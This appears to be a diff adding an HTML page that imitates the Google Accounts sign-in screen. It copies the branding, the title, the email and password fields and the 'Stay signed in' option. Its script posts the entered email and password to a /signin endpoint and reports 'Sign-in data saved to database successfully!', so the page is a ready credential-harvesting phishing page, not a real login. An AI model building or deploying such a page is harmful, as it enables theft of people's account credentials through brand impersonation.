@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="icon" type="image/png" href="google.png">
+    <link rel="shortcut icon" type="image/png" href="google.png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #202124;
+        }
+
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 48px 40px 36px;
+            width: 100%;
+            max-width: 450px;
+        }
+
+        .google-logo {
+            display: block;
+            margin: 0 auto 24px;
+       
+            height: 54px;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .input-container {
+            position: relative;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s ease;
+            background: transparent;
+        }
+
+        .form-input:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+            padding: 12px 14px;
+        }
+
+        .form-input:focus + .input-label,
+        .form-input:not(:placeholder-shown) + .input-label {
+            transform: translateY(0px) scale(0.1) ;
+            color: #ffffff;
+        }
+
+        .input-label {
+            position: absolute;
+            left: 15px;
+            top: 13px;
+            color: #5f6368;
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0s ease;
+            transform-origin: left top;
+        }
+
+        .forgot-password {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 24px;
+            gap: 12px;
+        }
+
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .create-account:hover {
+            text-decoration: underline;
+        }
+
+        .next-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 9px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .next-btn:hover {
+            background: #1557b0;
+            box-shadow: 0 1px 2px rgba(60, 64, 67, 0.3), 0 1px 3px rgba(60, 64, 67, 0.15);
+        }
+
+        .next-btn:active {
+            background: #1246a0;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: flex-start;
+            margin: 16px 0;
+            gap: 8px;
+        }
+
+        .checkbox {
+            width: 18px;
+            height: 18px;
+            margin-top: 2px;
+        }
+
+        .checkbox-label {
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.4;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px 20px;
+                margin: 16px;
+            }
+            
+            .buttons {
+                flex-direction: column-reverse;
+                align-items: stretch;
+            }
+            
+            .next-btn {
+                width: 100%;
+                margin-bottom: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img class="google-logo"  src="google.png" alt="Google Logo">
+
+        <h1 class="title">Sign in</h1>
+        <p class="subtitle">Use your Google Account</p>
+        
+        <form id="signin-form" action="/signin" method="POST">
+            <div class="form-group">
+                <div class="input-container">
+                    <input type="email" class="form-input" id="email" name="email" placeholder=" " required>
+                    <label for="email" class="input-label">Email or phone</label>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <div class="input-container">
+                    <input type="password" class="form-input" id="password" name="password" placeholder=" " required>
+                    <label for="password" class="input-label">Password</label>
+                </div>
+            </div>
+            
+            <div style="text-align: left; margin-bottom: 24px;">
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </div>
+            
+            <div class="checkbox-container">
+                <input type="checkbox" id="stay-signed-in" name="staySignedIn" class="checkbox">
+                <label for="stay-signed-in" class="checkbox-label">
+                    Stay signed in on this device. Not recommended on shared devices.
+                </label>
+            </div>
+            
+            <div class="buttons">
+                <a href="#" class="create-account">Create account</a>
+                <button type="submit" class="next-btn">Next</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // Handle form submission with AJAX
+document.getElementById('signin-form').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const formData = new FormData(this);
+    const email = formData.get('email');
+    const password = formData.get('password');
+    
+    // Send data to backend
+    fetch('/signin', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            email: email,
+            password: password,
+            staySignedIn: formData.get('staySignedIn')
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            alert('Sign-in data saved to database successfully!');
+            console.log('Saved with ID:', data.id);
+        } else {
+            alert('Error: ' + data.message);
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('Network error occurred');
+    });
+});
+    </script>
+</body>
+</html>
